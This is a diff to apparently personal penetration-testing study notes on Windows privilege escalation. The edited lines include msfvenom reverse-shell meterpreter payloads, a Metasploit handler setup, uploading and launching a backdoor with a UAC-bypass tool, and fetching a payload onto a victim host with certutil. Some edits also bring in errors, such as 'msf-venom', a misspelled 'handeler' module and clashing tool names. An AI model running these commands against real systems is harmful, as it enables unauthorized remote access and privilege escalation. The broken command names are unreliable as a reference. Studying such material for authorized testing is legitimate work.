@@ -16,7 +16,7 @@
 - msfvenom -- to generate payload
 	 -  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=1234 -f asp > shell.asp`
 	 - `service start postgresql && msfconsole` -- we need db because metasploit framework console requires the actual metasploit framework db
-	 - `use multi/handeler`
+	 - `use exploit/multi/handeler`
 	 - `set payload windows/meterpreter/reverse_tcp`
 	 - `set LHOST <YOUR IP>`
 	 - `set LPORT 1234`
@@ -107,7 +107,7 @@ that is a part of the local administrators group on the Windows target system
 		   set LPORT 1234
 		   run
 	- Now upload the backdoor `upload backdoor.exe` and `upload /path/to/Akagai64.exe`
-	- `./Akagai46.exe 23 /path/to/backdoor` 
+	- `./Akagai46.exe 23 /path/to/backdoor` (Note: Please provide the full path of the backdoor executable)
 
 ###### Access Token Impersonation
 - An access token will typically be assigned one of the following security levels:
@@ -132,7 +132,7 @@ that is a part of the local administrators group on the Windows target system
 - The LSA (Local Security Authority) or LSASS (Local Security Authority SubSystem) is responsible for authentication on Windows. And this particular service also has a cache of memory that will contain hashes as it interact with SAM database
 - Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
 ###### Searching For Passwords In Windows Configuration Files
-- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOU IP] LPORT=1234 -f exe > payload.exe`
+- `msf-venom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOU IP] LPORT=1234 -f exe > payload.exe`
 - `python -m SimpleHTTPServer 80` -- on your machine
    `certutil -urlcache -f http://[Your IP]/payload.exe payload.exe` -- on attacker/victim machine
    On Msfconsole
